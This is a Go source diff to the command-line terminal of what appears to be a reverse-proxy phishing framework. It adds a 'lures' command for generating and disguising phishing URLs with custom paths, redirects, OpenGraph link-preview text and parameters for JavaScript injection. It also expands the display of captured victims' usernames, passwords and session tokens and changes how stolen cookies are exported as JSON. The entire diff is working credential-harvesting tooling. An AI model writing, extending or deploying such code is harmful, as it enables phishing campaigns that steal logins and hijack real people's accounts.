@@ -72,7 +72,7 @@ func (t *Terminal) Close() {
 
 func (t *Terminal) output(s string, args ...interface{}) {
 	out := fmt.Sprintf(s, args...)
-	fmt.Fprintf(color.Output, "\n%s\n\n", out)
+	fmt.Fprintf(color.Output, "\n%s\n", out)
 }
 
 func (t *Terminal) DoWork() {
@@ -83,6 +83,8 @@ func (t *Terminal) DoWork() {
 
 	t.cfg.refreshActiveHostnames()
 	t.updateCertificates("")
+
+	t.output("%s", t.sprintPhishletStatus(""))
 
 	for !do_quit {
 		line, err := t.rl.Readline()
@@ -128,6 +130,12 @@ func (t *Terminal) DoWork() {
 			err := t.handlePhishlets(args[1:])
 			if err != nil {
 				log.Error("phishlets: %v", err)
+			}
+		case "lures":
+			cmd_ok = true
+			err := t.handleLures(args[1:])
+			if err != nil {
+				log.Error("lures: %v", err)
 			}
 		case "help":
 			cmd_ok = true
@@ -198,6 +206,7 @@ func (t *Terminal) handleSessions(args []string) error {
 	lgreen := color.New(color.FgHiGreen)
 	yellow := color.New(color.FgYellow)
 	lred := color.New(color.FgHiRed)
+	cyan := color.New(color.FgCyan)
 
 	pn := len(args)
 	if pn == 0 {
@@ -250,12 +259,23 @@ func (t *Terminal) handleSessions(args []string) error {
 				}
 
 				keys := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "user-agent", "remote ip", "create time", "update time"}
-				vals := []string{strconv.Itoa(s.Id), lred.Sprintf(s.Phishlet), lblue.Sprintf(s.Username), lblue.Sprintf(s.Password), tcol, yellow.Sprintf(s.LandingURL), dgray.Sprintf(s.UserAgent), yellow.Sprintf(s.RemoteAddr), dgray.Sprintf(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprintf(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"))}
-				log.Printf("\n%s\n", AsRows(keys, vals))
+				vals := []string{strconv.Itoa(s.Id), lred.Sprint(s.Phishlet), lblue.Sprint(s.Username), lblue.Sprint(s.Password), tcol, yellow.Sprint(s.LandingURL), dgray.Sprint(s.UserAgent), yellow.Sprint(s.RemoteAddr), dgray.Sprint(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprint(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"))}
+				log.Printf("\n%s", AsRows(keys, vals))
+
+				if len(s.Custom) > 0 {
+					var ckeys []string = []string{"custom", "value"}
+					var cvals [][]string
+					for k, v := range s.Custom {
+						cvals = append(cvals, []string{dgray.Sprint(k), cyan.Sprint(v)})
+					}
+					log.Printf("\n%s", AsTable(ckeys, cvals))
+				}
 
 				if len(s.Tokens) > 0 {
 					json_tokens := t.tokensToJSON(pl, s.Tokens)
-					t.output("%s", json_tokens)
+					t.output("%s\n", json_tokens)
+				} else {
+					t.output("\n")
 				}
 				break
 			}
@@ -392,7 +412,7 @@ func (t *Terminal) handlePhishlets(args []string) error {
 				}
 				out += t.cfg.GetServerIP() + " " + h
 			}
-			t.output("%s", out)
+			t.output("%s\n", out)
 			return nil
 		}
 	} else if pn == 3 {
@@ -415,24 +435,287 @@ func (t *Terminal) handlePhishlets(args []string) error {
 			if !ok || len(bhost) == 0 {
 				return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
 			}
-			urls, err := pl.GetLandingUrls(args[2])
+			urls, err := pl.GetLandingUrls(args[2], true)
 			if err != nil {
 				return err
 			}
 			out := ""
 			n := 0
-			yellow := color.New(color.FgYellow)
+			hblue := color.New(color.FgHiCyan)
 			for _, u := range urls {
 				if n > 0 {
 					out += "\n"
 				}
-				out += yellow.Sprint(u)
+				out += hblue.Sprint(u)
 				n += 1
 			}
-			t.output("%s", out)
+			log.Warning("`get-url` is deprecated - please use `lures` with custom `path` instead")
+			t.output("%s\n", out)
 			return nil
 		}
 	}
+	return fmt.Errorf("invalid syntax: %s", args)
+}
+
+func (t *Terminal) handleLures(args []string) error {
+	hiblue := color.New(color.FgHiBlue)
+	yellow := color.New(color.FgYellow)
+	//hiwhite := color.New(color.FgHiWhite)
+	hcyan := color.New(color.FgHiCyan)
+	cyan := color.New(color.FgCyan)
+	dgray := color.New(color.FgHiBlack)
+
+	pn := len(args)
+
+	if pn == 0 {
+		// list lures
+		t.output("%s", t.sprintLures())
+		return nil
+	}
+	if pn > 0 {
+		switch args[0] {
+		case "create":
+			if pn == 2 {
+				_, err := t.cfg.GetPhishlet(args[1])
+				if err != nil {
+					return err
+				}
+				l := &Lure{
+					Path:     "/" + GenRandomString(8),
+					Phishlet: args[1],
+					Params:   make(map[string]string),
+				}
+				t.cfg.AddLure(args[1], l)
+				log.Info("created lure with ID: %d", len(t.cfg.lures)-1)
+				return nil
+			}
+			return fmt.Errorf("incorrect number of arguments")
+		case "get-url":
+			if pn == 2 {
+				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
+				if err != nil {
+					return fmt.Errorf("get-url: %v", err)
+				}
+				l, err := t.cfg.GetLure(l_id)
+				if err != nil {
+					return fmt.Errorf("get-url: %v", err)
+				}
+				pl, err := t.cfg.GetPhishlet(l.Phishlet)
+				if err != nil {
+					return fmt.Errorf("get-url: %v", err)
+				}
+				bhost, ok := t.cfg.GetSiteDomain(pl.Site)
+				if !ok || len(bhost) == 0 {
+					return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
+				}
+				purl, err := pl.GetLureUrl(l.Path)
+				if err != nil {
+					return err
+				}
+				out := hiblue.Sprint(purl)
+				t.output("%s\n", out)
+				return nil
+			}
+			return fmt.Errorf("incorrect number of arguments")
+		case "edit":
+			if pn == 4 {
+				l_id, err := strconv.Atoi(strings.TrimSpace(args[2]))
+				if err != nil {
+					return fmt.Errorf("edit: %v", err)
+				}
+				l, err := t.cfg.GetLure(l_id)
+				if err != nil {
+					return fmt.Errorf("edit: %v", err)
+				}
+				val := args[3]
+				do_update := false
+
+				switch args[1] {
+				case "path":
+					if val != "" {
+						u, err := url.Parse(val)
+						if err != nil {
+							return fmt.Errorf("edit: %v", err)
+						}
+						l.Path = u.EscapedPath()
+						if len(l.Path) == 0 || l.Path[0] != '/' {
+							l.Path = "/" + l.Path
+						}
+					} else {
+						l.Path = "/"
+					}
+					do_update = true
+					log.Info("path = '%s'", l.Path)
+				case "redirect_url":
+					if val != "" {
+						u, err := url.Parse(val)
+						if err != nil {
+							return fmt.Errorf("edit: %v", err)
+						}
+						if !u.IsAbs() {
+							return fmt.Errorf("edit: redirect url must be absolute")
+						}
+						l.RedirectUrl = u.String()
+					} else {
+						l.RedirectUrl = ""
+					}
+					do_update = true
+					log.Info("redirect_url = '%s'", l.RedirectUrl)
+				case "phishlet":
+					_, err := t.cfg.GetPhishlet(val)
+					if err != nil {
+						return fmt.Errorf("edit: %v", err)
+					}
+					l.Phishlet = val
+					do_update = true
+					log.Info("phishlet = '%s'", l.Phishlet)
+				case "info":
+					l.Info = val
+					do_update = true
+					log.Info("info = '%s'", l.Info)
+				case "og_title":
+					l.OgTitle = val
+					do_update = true
+					log.Info("og_title = '%s'", l.OgTitle)
+				case "og_desc":
+					l.OgDescription = val
+					do_update = true
+					log.Info("og_desc = '%s'", l.OgDescription)
+				case "og_image":
+					if val != "" {
+						u, err := url.Parse(val)
+						if err != nil {
+							return fmt.Errorf("edit: %v", err)
+						}
+						if !u.IsAbs() {
+							return fmt.Errorf("edit: image url must be absolute")
+						}
+						l.OgImageUrl = u.String()
+					} else {
+						l.OgImageUrl = ""
+					}
+					do_update = true
+					log.Info("og_image = '%s'", l.OgImageUrl)
+				case "og_url":
+					if val != "" {
+						u, err := url.Parse(val)
+						if err != nil {
+							return fmt.Errorf("edit: %v", err)
+						}
+						if !u.IsAbs() {
+							return fmt.Errorf("edit: site url must be absolute")
+						}
+						l.OgUrl = u.String()
+					} else {
+						l.OgUrl = ""
+					}
+					do_update = true
+					log.Info("og_url = '%s'", l.OgUrl)
+				case "params":
+					sp := strings.Index(val, "=")
+					if sp == -1 {
+						return fmt.Errorf("edit: to set a custom parameter, use format 'key=value' or 'key=' if you want to remove a custom parameter")
+					}
+					k := val[:sp]
+					v := val[sp+1:]
+					if v != "" {
+						l.Params[k] = v
+						log.Info("params: '%s' = '%s'", k, v)
+					} else {
+						delete(l.Params, k)
+						log.Info("params: deleted '%s'", k)
+					}
+					do_update = true
+				}
+				if do_update {
+					err := t.cfg.SetLure(l_id, l)
+					if err != nil {
+						return fmt.Errorf("edit: %v", err)
+					}
+					return nil
+				}
+			} else {
+				return fmt.Errorf("incorrect number of arguments")
+			}
+		case "delete":
+			if pn == 2 {
+				if len(t.cfg.lures) == 0 {
+					break
+				}
+				if args[1] == "all" {
+					di := []int{}
+					for n, _ := range t.cfg.lures {
+						di = append(di, n)
+					}
+					if len(di) > 0 {
+						rdi := t.cfg.DeleteLures(di)
+						for _, id := range rdi {
+							log.Info("deleted lure with ID: %d", id)
+						}
+					}
+					return nil
+				} else {
+					rc := strings.Split(args[1], ",")
+					di := []int{}
+					for _, pc := range rc {
+						pc = strings.TrimSpace(pc)
+						rd := strings.Split(pc, "-")
+						if len(rd) == 2 {
+							b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
+							if err != nil {
+								return fmt.Errorf("delete: %v", err)
+							}
+							e_id, err := strconv.Atoi(strings.TrimSpace(rd[1]))
+							if err != nil {
+								return fmt.Errorf("delete: %v", err)
+							}
+							for i := b_id; i <= e_id; i++ {
+								di = append(di, i)
+							}
+						} else if len(rd) == 1 {
+							b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
+							if err != nil {
+								return fmt.Errorf("delete: %v", err)
+							}
+							di = append(di, b_id)
+						}
+					}
+					if len(di) > 0 {
+						rdi := t.cfg.DeleteLures(di)
+						for _, id := range rdi {
+							log.Info("deleted lure with ID: %d", id)
+						}
+					}
+					return nil
+				}
+			}
+			return fmt.Errorf("incorrect number of arguments")
+		default:
+			id, err := strconv.Atoi(args[0])
+			if err != nil {
+				return err
+			}
+			l, err := t.cfg.GetLure(id)
+			if err != nil {
+				return err
+			}
+
+			keys := []string{"phishlet", "path", "redirect_url", "info", "og_title", "og_desc", "og_image", "og_url"}
+			vals := []string{hiblue.Sprint(l.Phishlet), hcyan.Sprint(l.Path), yellow.Sprint(l.RedirectUrl), l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl)}
+			log.Printf("\n%s\n", AsRows(keys, vals))
+
+			if len(l.Params) > 0 {
+				var ckeys []string = []string{"key", "value"}
+				var cvals [][]string
+				for k, v := range l.Params {
+					cvals = append(cvals, []string{dgray.Sprint(k), cyan.Sprint(v)})
+				}
+				log.Printf("custom parameters:\n%s\n", AsTable(ckeys, cvals))
+			}
+			return nil
+		}
+	}
+
 	return fmt.Errorf("invalid syntax: %s", args)
 }
 
@@ -468,6 +751,25 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("sessions", []string{"delete"}, "delete <id>", "delete logged session with <id> (ranges with separators are allowed e.g. 1-7,10-12,15-25)")
 	h.AddSubCommand("sessions", []string{"delete", "all"}, "delete all", "delete all logged sessions")
 
+	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
+		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"),
+			readline.PcItem("edit", readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("params")),
+			readline.PcItem("delete", readline.PcItem("all"))))
+	h.AddSubCommand("lures", nil, "", "show all create lures")
+	h.AddSubCommand("lures", nil, "<id>", "show details of a lure with a given <id>")
+	h.AddSubCommand("lures", []string{"create"}, "create <phishlet>", "creates new lure for given <phishlet>")
+	h.AddSubCommand("lures", []string{"delete"}, "delete <id>", "deletes lure with given <id>")
+	h.AddSubCommand("lures", []string{"delete", "all"}, "delete all", "deletes all created lures")
+	h.AddSubCommand("lures", []string{"edit", "path"}, "edit path <id> <path>", "sets custom url <path> for a lure with a given <id>")
+	h.AddSubCommand("lures", []string{"edit", "redirect_url"}, "edit redirect_url <id> <redirect_url>", "sets redirect url that user will be navigated to on successful authorization, for a lure with a given <id>")
+	h.AddSubCommand("lures", []string{"edit", "phishlet"}, "edit phishlet <id> <phishlet>", "change the phishlet, the lure with a given <id> applies to")
+	h.AddSubCommand("lures", []string{"edit", "info"}, "edit info <id> <info>", "set personal information to describe a lure with a given <id> (display only)")
+	h.AddSubCommand("lures", []string{"edit", "og_title"}, "edit og_title <id> <title>", "sets opengraph title that will be shown in link preview, for a lure with a given <id>")
+	h.AddSubCommand("lures", []string{"edit", "og_desc"}, "edit og_desc <id> <title>", "sets opengraph description that will be shown in link preview, for a lure with a given <id>")
+	h.AddSubCommand("lures", []string{"edit", "og_image"}, "edit og_image <id> <title>", "sets opengraph image url that will be shown in link preview, for a lure with a given <id>")
+	h.AddSubCommand("lures", []string{"edit", "og_url"}, "edit og_url <id> <title>", "sets opengraph url that will be shown in link preview, for a lure with a given <id>")
+	h.AddSubCommand("lures", []string{"edit", "params"}, "edit params <id> <key=value>", "adds, edits or removes custom parameters (used in javascript injections), for a lure with a given <id>")
+
 	h.AddCommand("clear", "general", "clears the screen", "Clears the screen.", LAYER_TOP,
 		readline.PcItem("clear"))
 
@@ -496,7 +798,10 @@ func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]map[string]*data
 				Name:           k,
 				HttpOnly:       v.HttpOnly,
 			}
-			if domain[:1] != "." {
+			if domain[:1] == "." {
+				c.HostOnly = false
+				c.Domain = domain[1:]
+			} else {
 				c.HostOnly = true
 			}
 			if c.Path == "" {
@@ -544,13 +849,14 @@ func (t *Terminal) updateCertificates(site string) {
 }
 
 func (t *Terminal) sprintPhishletStatus(site string) string {
-	ret := ""
 	higreen := color.New(color.FgHiGreen)
 	hired := color.New(color.FgHiRed)
 	hiblue := color.New(color.FgHiBlue)
 	yellow := color.New(color.FgYellow)
 	hiwhite := color.New(color.FgHiWhite)
 	n := 0
+	cols := []string{"phishlet", "author", "active", "status", "hostname"}
+	var rows [][]string
 	for s, _ := range t.cfg.phishlets {
 		if site == "" || s == site {
 			pl, err := t.cfg.GetPhishlet(s)
@@ -566,19 +872,54 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 			if t.cfg.IsSiteHidden(s) {
 				hidden_status = hired.Sprint("hidden")
 			}
-			if n > 0 {
-				ret += "\n\n"
-			}
-			ret += "  phishlet: " + hiblue.Sprint(s) + "\n"
-			ret += "    author: " + hiwhite.Sprint(pl.Author) + "\n"
-			ret += "    active: " + status + "\n"
-			ret += "    status: " + hidden_status + "\n"
 			domain, _ := t.cfg.GetSiteDomain(s)
-			ret += "  hostname: " + yellow.Sprint(domain)
 			n += 1
+
+			rows = append(rows, []string{hiblue.Sprint(s), hiwhite.Sprint(pl.Author), status, hidden_status, yellow.Sprint(domain)})
 		}
 	}
-	return ret
+	return AsTable(cols, rows)
+}
+
+func (t *Terminal) sprintLures() string {
+	higreen := color.New(color.FgHiGreen)
+	//hired := color.New(color.FgHiRed)
+	hiblue := color.New(color.FgHiBlue)
+	yellow := color.New(color.FgYellow)
+	hiwhite := color.New(color.FgHiWhite)
+	hcyan := color.New(color.FgHiCyan)
+	//n := 0
+	cols := []string{"id", "phishlet", "path", "redirect_url", "og", "params", "info"}
+	var rows [][]string
+	for n, l := range t.cfg.lures {
+		var og string
+		if l.OgTitle != "" {
+			og += higreen.Sprint("x")
+		} else {
+			og += "-"
+		}
+		if l.OgDescription != "" {
+			og += higreen.Sprint("x")
+		} else {
+			og += "-"
+		}
+		if l.OgImageUrl != "" {
+			og += higreen.Sprint("x")
+		} else {
+			og += "-"
+		}
+		if l.OgUrl != "" {
+			og += higreen.Sprint("x")
+		} else {
+			og += "-"
+		}
+		params := "0"
+		if len(l.Params) > 0 {
+			params = hiwhite.Sprint(strconv.Itoa(len(l.Params)))
+		}
+		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), hcyan.Sprint(l.Path), yellow.Sprint(l.RedirectUrl), og, params, l.Info})
+	}
+	return AsTable(cols, rows)
 }
 
 func (t *Terminal) phishletPrefixCompleter(args string) []string {
